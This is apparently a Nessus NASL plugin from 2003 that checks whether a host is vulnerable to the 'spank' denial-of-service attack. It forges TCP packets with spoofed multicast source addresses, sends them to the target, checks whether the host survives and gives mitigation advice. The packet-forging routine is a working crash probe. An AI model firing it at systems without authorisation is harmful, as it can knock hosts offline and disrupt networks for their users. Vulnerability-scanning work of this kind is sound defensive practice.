#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#

if(description)
{
 script_id(11901);
 script_version ("$Revision: 1.8 $");
 
 name["english"] = "spank.c";
 script_name(english:name["english"]);
 
 desc["english"] = "
Your machine answers to TCP packets that are coming from a multicast
address. This is known as the 'spank' denial of service attack.

An attacker might use this flaw to shut down this server and
saturate your network, thus preventing you from working properly.
This also could be used to run stealth scans against your machine.

Solution : contact your operating system vendor for a patch.
           Filter out multicast addresses (224.0.0.0/4)

Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Sends a TCP packet from a multicast address";
 script_summary(english:summary["english"]);
 
 # Some IP stacks are crashed by this attack
 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 exit(0);
}

#

# We could use a better pcap filter to avoid a false positive... 
if (islocalhost()) exit(0);

dest = get_host_ip();

a = 224 +  rand() % 16;
b = rand() % 256;
c = rand() % 256;
d = rand() % 256;
src = strcat(a, ".", b, ".", c, ".", d);

if (! defined_func("join_multicast_group"))
  m = 0;
else
  m = join_multicast_group(src);
if (! m && ! islocalnet()) exit(0);
# Either we need to upgrade libnasl, or multicast is not 
# supported on this host / network
# If we are on the same network, the script may work, otherwise, the chances
# are very small -- only if we are on the way to the default multicast
# gateway

start_denial();

id = rand() % 65536;
seq = rand();
ack = rand();

#port = get_host_open_port();
sport = rand() % 65535 + 1;
dport = rand() % 65535 + 1;
			
ip = forge_ip_packet(ip_v: 4, ip_hl : 5, ip_tos : 0x08, ip_len : 20,
		     ip_id : id, ip_p : IPPROTO_TCP, ip_ttl : 255,
		     ip_off : 0, ip_src : src);

tcpip = forge_tcp_packet(ip: ip, th_sport: sport, th_dport: dport,   
			 th_flags: TH_ACK, th_seq: seq, th_ack: 0,
			 th_x2: 0, th_off: 5,  th_win: 2048, th_urp: 0);

pf = strcat("src host ", dest, " and dst host ", src);
ok = 0;
for (i = 0; i < 3 && ! ok; i ++)
{
  r = send_packet(tcpip, pcap_active:TRUE, pcap_filter: pf);
  if (r) ok = 1;
}

alive = end_denial();
if (! alive)
{
  report = "
Your machine crashed when it received a TCP packet that were coming 
from a multicast address. This is known as the 'spank' denial of 
service attack.

An attacker might use this flaw to shut down this server, thus 
preventing you from working properly.

Solution : contact your operating system vendor for a patch.
           Filter out multicast addresses (224.0.0.0/4)

Risk factor : High";
  security_hole(port: 0, proto: "tcp", data: report);
  set_kb_item(name:"Host/dead", value:TRUE);
}
else if (r)
  security_warning(port: 0, proto: "tcp");
